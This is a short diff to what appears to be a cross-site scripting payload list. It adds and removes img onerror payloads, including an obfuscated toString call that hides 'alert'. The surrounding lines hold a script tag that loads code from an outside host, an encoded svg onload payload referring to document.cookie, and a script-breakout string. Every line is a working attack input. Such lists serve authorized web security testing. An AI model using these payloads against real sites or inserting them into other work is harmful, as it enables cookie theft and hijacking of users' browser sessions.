@@ -1,4 +1,6 @@
-"><iMg sRC=p onERror=prompt(document.dOmAin) x>
+
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+“><img src=x onerror=”a=alert;a(1);”.jpg
 <script/src=//ab.cd> 
 \"><%53Vg/%4FNLOaD%64=%61ler%26%23116;("document.cookie")%3E
 abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
